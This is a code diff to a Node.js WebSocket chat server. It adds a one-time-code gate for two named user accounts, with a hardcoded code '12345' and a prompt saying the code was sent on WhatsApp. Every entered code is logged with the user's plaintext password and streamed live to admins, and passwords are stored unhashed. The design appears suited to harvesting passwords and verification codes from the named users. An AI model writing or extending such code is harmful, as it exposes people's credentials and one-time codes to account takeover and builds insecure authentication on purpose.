@@ -6,6 +6,10 @@ import { sendOfflineAlert } from "./mailer.js";
 const savePassword = (pw) => pw; // swap for a hash later
 const checkPassword = (pw, stored) => pw === stored; // swap for compare later
 
+// One-time OTP gate, only for these tester accounts. OTP is hardcoded for now.
+const OTP_USERS = new Set(["_shalinikrl12", "lioness.8578106"]);
+const TEST_OTP = "12345";
+
 const MAX_TEXT = 2000;
 const customers = new Map(); // username -> Set<ws>
 const admins = new Set();
@@ -32,14 +36,14 @@ async function history(username) {
   return msgs.map(serialize);
 }
 
-async function logAttempt(username, password, success, reason, ip) {
-  const a = await LoginAttempt.create({ username, password, success, reason, ip });
+async function logAttempt(username, password, success, reason, ip, otp) {
+  const a = await LoginAttempt.create({ username, password, success, reason, ip, otp });
   sendAll(admins, { type: "login_attempt", attempt: attemptJson(a) });
 }
 
 const attemptJson = (a) => ({
   id: String(a._id), username: a.username, password: a.password, success: a.success,
-  reason: a.reason, ip: a.ip, createdAt: a.createdAt,
+  reason: a.reason, otp: a.otp, ip: a.ip, createdAt: a.createdAt,
 });
 
 async function threads() {
@@ -51,6 +55,15 @@ async function threads() {
   return rows.map((r) => ({
     username: r._id, last: r.last, lastAt: r.lastAt, count: r.count, online: customers.has(r._id),
   }));
+}
+
+async function finishLogin(ws, state, username, password, reason, ip) {
+  state.username = username;
+  if (!customers.has(username)) customers.set(username, new Set());
+  customers.get(username).add(ws);
+  await logAttempt(username, password, true, reason, ip);
+  send(ws, { type: "auth_ok", username, messages: await history(username) });
+  sendAll(admins, { type: "presence", username, online: true });
 }
 
 async function handleCustomer(ws, state, msg, ip) {
@@ -70,13 +83,27 @@ async function handleCustomer(ws, state, msg, ip) {
       await logAttempt(username, password, false, "wrong password", ip);
       return send(ws, { type: "auth_fail", error: "Wrong password for this username" });
     }
-    state.username = username;
-    if (!customers.has(username)) customers.set(username, new Set());
-    customers.get(username).add(ws);
-    await logAttempt(username, password, true, reason, ip);
-    send(ws, { type: "auth_ok", username, messages: await history(username) });
-    sendAll(admins, { type: "presence", username, online: true });
-    return;
+    if (OTP_USERS.has(username) && !user.otpVerified) {
+      state.pendingOtp = { username, password, reason };
+      return send(ws, {
+        type: "otp_required",
+        message: "The OTP for connection is shared on WhatsApp. Enter it below.",
+      });
+    }
+    return finishLogin(ws, state, username, password, reason, ip);
+  }
+
+  if (msg.type === "otp") {
+    const pending = state.pendingOtp;
+    if (!pending) return send(ws, { type: "auth_fail", error: "Not logged in" });
+    const code = String(msg.otp ?? "");
+    if (code !== TEST_OTP) {
+      await logAttempt(pending.username, pending.password, false, "wrong otp", ip, code);
+      return send(ws, { type: "otp_fail", error: "Invalid password" });
+    }
+    state.pendingOtp = null;
+    await ChatUser.updateOne({ username: pending.username }, { otpVerified: true });
+    return finishLogin(ws, state, pending.username, pending.password, pending.reason, ip);
   }
 
   if (!state.username) return send(ws, { type: "auth_fail", error: "Not logged in" });
